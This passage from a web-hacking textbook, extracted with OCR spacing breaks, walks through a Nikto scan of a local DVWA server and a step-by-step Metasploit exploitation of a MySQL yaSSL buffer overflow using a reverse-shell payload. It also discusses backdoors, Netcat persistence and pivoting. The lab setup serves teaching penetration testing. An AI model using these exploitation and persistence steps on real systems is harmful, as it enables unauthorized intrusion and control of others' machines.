+disclosures of all vulnerabilities are cataloged. I encourage you to use all these resources
+as you work on web server hacking!
+
+Nikto
+
+Nikto is an open-source vulnerability scanner, wri en in Perl and originally released in
+late 2001, that provides additional vulnerability scanning speciﬁc to web servers. I t
+performs checks for 6400 potentially dangerous ﬁles and scripts, 1200 outdated server
+versions, and nearly 300 version-specific problems on web servers.
+There is even functionality to have Nikto launched automatically from Nessus when a
+web server is found. We will be running Nikto directly from the command line in a
+BackTrack terminal, but you can search the Nessus blog for the write-up on how these two
+tools can work together in an automated way.
+Nikto is built into BackTrack and is executed directly in the terminal. First, you need to
+browse to the Nikto directory by executing the cd /pentest/web/nikto command in a
+terminal window.
+A lternatively, you can launch a terminal window directly in the N ikto directory from
+the BackTrack menu by clicking A pplications → BackT rack → V ulnerability
+A ssessment → Web A pplication A ssessment → Web V ulnerability Scanners → N iktoas
+shown in Figure 2.6.
+
+FIGURE 2.6 Opening Nikto from BackTrack menu.
+
+You should always update Nikto by executing the perl nikto.pl -update command
+before using the scanner to ensure that you have the most recent plug-in signatures. You
+can run the scanner against our localhost with the following command where the -h
+switch is used to deﬁne our target address (127.0.0.1) and the -p switch is used to specify
+which ports we want to probe (1-500).
+perl nikto.pl -h 127.0.0.1 -p 1–500
+
+I t would have been just as simple to specify only port 80 for our scan as we already
+know this is the only port that D VWA is using to communicate over HTTP. I n fact, if you
+don’t specify ports for Nikto to scan, it will scan only port 80 by default. A s expected,
+Nikto provides summary results from its scan of our DVWA web server.
++ Server: Apache/2.2.14 (Ubuntu)
++ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.9
++ Root page / redirects to: login.php
++ robots.txt contains 1 entry which should be manually viewed.
++ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19).
+Apache 1.3.42 (final release) and 2.0.64 are also current.
++ ETag header found on server, inode: 829490, size: 26, mtime: 0x4c4799096fba4
++ OSVDB-3268: /config/: Directory indexing found.
++ /config/: Configuration information may be available remotely.
++ OSVDB-3268: /doc/: Directory indexing found.
++ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
++
+OSVDB-12184:
+/index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000:
+PHP
+reveals potentially sensitive information via certain HTTP requests that contain
+specific QUERY strings.
++ OSVDB-561: /server-status: This reveals Apache information. Comment out
+appropriate line in httpd.conf or restrict access to allowed hosts.
++ OSVDB-3092: /login/: This might be interesting. . .
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /docs/: Directory indexing found.
++ OSVDB-3092: /CHANGELOG.txt: A changelog was found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.php: Admin login page/section found.
++ 6456 items checked: 0 error(s) and 16 item(s) reported on remote host
++ End Time: 2012-07-11 09:27:23 (20 seconds)
+
+The most important take-away from Nikto’s output is the O pen S ource Vulnerability
+D atabase (O S VD B) entries that provide speciﬁc information about discovered
+vulnerabilities. These identiﬁers are very similar to the CVE identiﬁers thatNessus and
+Metasploit use. O S VD B is an independent and open-source project with the goal to
+provide unbiased technical information on over 90,000 vulnerabilities related to over
+70,000 products. I encourage you to visit http://osvdb.org for more information and to
+retrieve technical details from your Nikto findings.
+
+Exploitation
+Exploitation is the moment when all the information gathering, port scanning, and
+vulnerability scanning pays oﬀ and you gain unauthorized access to or execute remote
+code execution on the target machine. O ne goal of network exploitation is to gain
+
+administrative level rights on the target machine (web server in our world) and execute
+code. O nce that occurs, the hacker has complete control of that machine and is free to
+complete any action, which usually includes adding users, adding administrators,
+installing additional hacking tools locally on that machine to penetrate further into the
+network (also known as “pivoting”), and installing backdoor code that enables persistent
+connections to this exploited machine. A persistent backdoor is like creating a key to a
+house to gain entry, so you can stop breaking in through the basement window. I t’s
+much easier to use a key and you’re actually less likely to get caught!
+We are going to use Metasploit as our exploitation tool of choice. Metasploit is an
+exploitation framework developed by HD Moore and is widely accepted as the premiere
+open-source exploitation tool kit available today. The Metasploit Framework (MSF or msf)
+provides a structured way to exploit systems and allows for the community of users to
+develop, test, deploy, and share exploits with each other. O nce you understand the basics
+of the MSF, you can eﬀectively use it during all of your hacking adventures regardless of
+target systems. Metasploit is only a portion of one chapter in this book, but please take
+the time in the future to become more familiar with this great exploitation framework.
+Before we dive into the actual exploitation steps, a couple of deﬁnitions to ensure that
+we all are working from the same base terminology.
+■ Vulnerability: A potential weakness in the target system. It may be a missing patch,
+the use of known weak function (like strcpy in the C language), a poor
+implementation, or an incorrect usage of a compiled language (such as SQL), or any
+other potential problem that a hacker can target.
+■ Exploit: A collection of code that delivers a payload to a targeted system.
+■ Payload: The end goal of an exploit that results in malicious code being executed on
+the targeted system. Some popular payloads include bind shell (cmd window in
+Windows or a shell in Linux), reverse shell (when the victimized computer makes a
+connection back to you, which is much less likely to be detected), VNC injection to
+allow remote desktop control, and adding an administrator on the targeted system.
+
+Basics Of Metasploit
+We’ll be following a lightweight process that uses seven MSF commands to complete our
+exploitation phase:
+1. Search: We will search for all related exploits in MSF’s database based on the CVE
+identifiers reported in the Nessus results.
+2. Use: We will select the exploit that best matches the CVE identifier.
+3. Show Payloads: We will review the available payloads for the selected exploit.
+4. Set Payload: We will select the desired payload for the selected exploit.
+5. Show Options: We will review the necessary options that must be set as part of the
+selected payload.
+6. Set Options: We will assign value to all of the necessary options that must be
+present for the payload to succeed.
+7. Exploit: We will then send our well-crafted exploit to the targeted system.
+
+To begin, we need to launch the Metasploit framework. This is easily done in a terminal
+by issuing the msfconsole command. I t will take about a minute to load Metasploit
+(especially the ﬁrst time you run it), so don’t be alarmed if it seems nothing is
+happening. A ll the commands shown in this section are completed in a terminal window
+at the msf > prompt.
+I t is good practice to update Metasploit on an almost daily basis as new exploits are
+developed around the clock. The msfupdate command will update the entire framework
+so you can be sure that you have the latest and greatest version of Metasploit.
+
+Search
+
+The first task is to find available exploits in Metasploit that match the CVE identiﬁers that
+we found during vulnerability scanning with Nessus. We will search for CVE 2009–4484
+from our localhost-check vulnerability scan by issuing the search 2009–4484 command in
+Metasploit. This vulnerability targets the version of MySQL that our web server is
+running as it is vulnerable to multiple stack-based buﬀer overﬂows. This vulnerability
+allows remote attackers to execute arbitrary code or cause a denial of service.
+The results of this search will list all the available exploits that Metasploit can use
+against the vulnerability as introduced here.
+Matching Modules
+================
+Name Disclosure Date Rank Description
+---- --------------- ---- --------------exploit/linux/mysql/mysql_yassl_getname
+CertDecoder::GetName Buffer Overflow
+
+2010-01-25good
+
+MySQL
+
+yaSSL
+
+Use the exploit rank as a guide for which exploit to select. Each exploit will have one of
+seven possible rankings: excellent (best choice), great, good, normal, average, low, and
+manual (worst choice). The lower ranking exploits are more likely to crash the target
+system and may not be able to deliver the selected payload. We have only one exploit,
+with a good ranking, which will allow us to execute remote code on the target machine.
+This is a middle-of-the-road exploit, as most vulnerabilities will have excellent or great
+exploits.
+
+A le rt
+When thinking about exploitation, imagine you are on a big game hunting
+adventure. The search command is like reviewing all possible animals that
+you could target on such an adventure. D o you want to hunt bear, elk, or
+mountain lion?
+
+Use
+O nce you’ve retrieved all the possible exploits in M etasploit and decided on the best
+
+choice for your target, you can select it by issuing the following use command.
+use exploit/linux/mysql/mysql_yassl_getname
+
+You will receive the following prompt signaling that the use command has executed
+successfully.
+msf exploit(mysql_yassl_getname) >
+
+A le rt
+T h e use command is the equivalent of deciding we are going to hunt
+mountain lion on our hunting adventure!
+
+Show Payloads
+T he show payloads command displays all the possible payloads that you can pick from
+to be the payoﬀ when the exploit successfully lands. N ote that some of the payload
+descriptions wrap to a new line of text.
+Compatible Payloads
+===================
+Name Disclosure Date Rank Description
+---- --------------- ----- ----------generic/custom normal Custom Payload
+generic/debug_trap normal Generic x86 Debug Trap
+generic/shell_bind_tcp normal Generic Command Shell, Bind TCP Inline
+generic/shell_reverse_tcp normal Generic Command Shell, Reverse TCP Inline
+generic/tight_loop normal Generic x86 Tight Loop
+linux/x86/adduser normal Linux Add User
+linux/x86/chmod normal Linux Chmod
+linux/x86/exec normal Linux Execute Command
+linux/x86/meterpreter/bind_ipv6_tcp normal Linux Meterpreter, Bind TCP Stager
+(IPv6)
+linux/x86/meterpreter/bind_tcp normal Linux Meterpreter, Bind TCP Stager
+linux/x86/meterpreter/reverse_ipv6_tcp normal Linux Meterpreter, Reverse TCP
+Stager (IPv6)
+linux/x86/meterpreter/reverse_tcp normal Linux Meterpreter, Reverse TCP Stager
+linux/x86/metsvc_bind_tcp normal Linux Meterpreter Service, Bind TCP
+linux/x86/metsvc_reverse_tcp normal Linux Meterpreter Service, Reverse TCP
+Inline
+linux/x86/shell/bind_ipv6_tcp normal Linux Command Shell, Bind TCP Stager
+(IPv6)
+linux/x86/shell/bind_tcp normal Linux Command Shell, Bind TCP Stager
+linux/x86/shell/reverse_ipv6_tcp normal Linux Command Shell, Reverse TCP
+Stager (IPv6)
+linux/x86/shell/reverse_tcp normal Linux Command Shell, Reverse TCP Stager
+linux/x86/shell_bind_ipv6_tcp normal Linux Command Shell, Bind TCP Inline
+(IPv6)
+linux/x86/shell_bind_tcp normal Linux Command Shell, Bind TCP Inline
+linux/x86/shell_reverse_tcp normal Linux Command Shell, Reverse TCP Inline
+linux/x86/shell_reverse_tcp2 normal Linux Command Shell, Reverse TCP - Metasm
+
+demo
+
+A quick review of the rankings of these payloads doesn’t give us any direction on
+which one to select as they are all normal. That’s perfectly ﬁne; we could a empt this
+exploit several times with different payloads if we needed to.
+
+A le rt
+The show payloads command is like reviewing all possible gun types!
+
+Set Payload
+N ow that you know what payloads are available when you exploit the vulnerability, it’s
+time to make the payload choice. I n the following command, we select a reverse shell as
+the payload so we will have command line access to the target machine. The connection
+will be initiated from the exploited machine so it’s less likely to be caught by intrusion
+detection systems. You set the payload with the set payload command.
+set payload generic/shell_reverse_tcp
+
+You will receive the following conﬁrmation message and prompt signaling that the set
+payload command has executed successfully.
+payload => generic/shell_reverse_tcp
+msf exploit(mysql_yassl_getname) >
+
+A le rt
+T h e set payload command is like selecting a sniper riﬂe to hunt our
+mountain lion. (I f you haven’t guessed by now, I ’m not much of a hunter. But
+stick with me because the analogy is pure gold!)
+
+Show Options
+Each exploit and payload will have speciﬁc options that need to be set in order to be
+successful. I n most cases, we need to set the I P addresses of the targeted machine and
+our a acker machine. The targeted machine is known as the remote host (RHOST), while
+the a acker machine is known as the local host (LHOST). The show options command
+provides the following details for both the exploit and payload.
+Module options (exploit/linux/mysql/mysql_yassl_getname):
+Name Current Setting Required Description
+-------------------------------------RHOST yes The target address
+RPORT 3306 yes The target port
+Payload options (generic/shell_reverse_tcp):
+
+Name Current Setting Required Description
+-------------------------------------LHOST yes The listen address
+LPORT 4444 yes The listen port
+
+There are two options in this module that are required: RHOST and RPORT. These two
+entries dictate what address and port the exploit should be sent to. We will set the
+RHOST option in the upcoming section and leave the RPORT as is, so it uses port 3306.
+There are also two options in the payload that are required: LHOST and LPORT. We
+just need to set the LHOST on the payload, as it is required in order for this payload to
+succeed, and leave the LPORT as 4444.
+
+A le rt
+The show options command is like considering what supplies we are going to
+take on our hunting adventure. We need to select a bullet type, a scope type,
+and how big of a backpack to bring along on the trip.
+
+Set Option
+
+We need to assign values to all of the required exploit and payload options that are blank
+by default. I f you leave any of them blank, your exploit will fail because it doesn’t have
+the necessary information to successfully complete. We will be se ing both the RHOST
+and the LHOST to 127.0.0.1 because we have a self-contained environment. I n a real
+a ack, these two I P addresses would obviously be diﬀerent. Remember RHOST is the
+target machine and LHOST is your hacking machine. You can issue the set RH O ST
+127.0.0.1 and set LH O ST 127.0.0.1commands as introduced below to set these two
+options.
+set RHOST 127.0.0.1
+RHOST => 127.0.0.1
+set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+
+You can issue another show options command to make sure everything is set correctly
+before moving on.
+Module options (exploit/linux/mysql/mysql_yassl_getname):
+Name Current Setting Required Description
+---- --------------- -------- ----------RHOST 127.0.0.1 yes The target address
+RPORT 3306 yes The target port
+Payload options (generic/shell_reverse_tcp):
+Name Current Setting Required Description
+--- --------------- -------- -----------LHOST 127.0.0.1 yes The listen address
+LPORT 4444 yes The listen port
+
+It is confirmed that we have set all the required options for the exploit and the payload.
+We are almost there!
+
+A le rt
+T he set option command is like deciding we want Winchester bullets, the 8″
+night vision scope, and the 3-day backpack for our hunting adventure.
+
+Exploit
+You have done your homework and have come to the point where, with one click, you
+will have complete control of the targeted machine. S imply issue the exploit command
+and the exploit we built is sent to the target. I f your exploit is successful, you will receive
+the following conﬁrmation in the terminal where it displays there is one open session on
+the target machine.
+Command shell session 1 opened (127.0.0.1:4444 -> 127.0.0.1:3306)
+
+A le rt
+The exploit command is like pulling the trigger.
+
+You can interact with this session by issuing the sessions -i 1 command. You now
+control the target machine completely; it’s like you are si ing at the keyboard. You can
+see all open sessions by issuing the sessions command.
+
+A le rt
+I f you run into an “I nvalid session id” or “no active sessions” error, the
+problem is related to the conﬁguration of the MyS Q L running on your
+BackTrack VM. This speciﬁc exploit is only applicable to certain versions of
+MyS Q L running with a speciﬁc S S L conﬁguration. For more details of the
+exact conﬁguration and how you can tweak your VM to ensure successful
+exploitation, please see https://dev.mysql.com/doc/refman/5.1/en/configuringfor-ssl.html. Even if you tweak your MyS Q L installation, the exploitation
+steps introduced in this section remain completely unchanged. I n fact, these
+same steps can be used for most network-based a acks that you’d like to
+attempt!
+
+A nother option is to download another VM that is dedicated to network hacking and
+provides vulnerable services to conduct the steps in this chapter. Metasploitable is such a
+
+VM and is provided by the Metasploit team and can be downloaded at
+http://www.offensive-security.com/metasploit-unleashed/Metasploitable. You would then
+have two separate VMs to use to work through this chapter (one a acker and one victim
+VM).
+
+Maintaining Access
+Maintaining access is when a hacker is able to plant a backdoor so he/she maintains a
+complete control of the exploited machine and can come back to the machine at a later
+time without having to exploit it again. I t is the icing on the exploitation cake! A lthough
+it’s not part of our Basics of Web Hacking approach, it does deserve discussion. Topics
+such as rootkits, backdoors, Trojans, viruses, and botnets all fall into the maintaining
+access category.
+Perhaps the most common tool used during persistent access is Netcat. This tool has
+been dubbed the Swiss Army Knife of hacking because of its ﬂexibility in se ing up,
+conﬁguring, and processing network communication between several machines. Netcat is
+often one of the ﬁrst tools to get installed after exploiting a system because the hacker
+can then dig even deeper into the network and a empt to exploit additional computers
+by pivoting. Pivoting means using an already exploited machine as an a ack platform
+against additional computers on the internal network that would otherwise be totally
+inaccessible to outside traﬃc. There are exact Netcat examples in later chapters, as we
+exploit the web application. A s more computers are exploited, the hacker continues to
+pivot deeper into the internal network and, if left undetected, may eventually
+compromise all network computers. This is the stuff dreams are made of for hackers!
+
+C H AP T E R 3
+
+Web Application Recon and Scanning
+
+
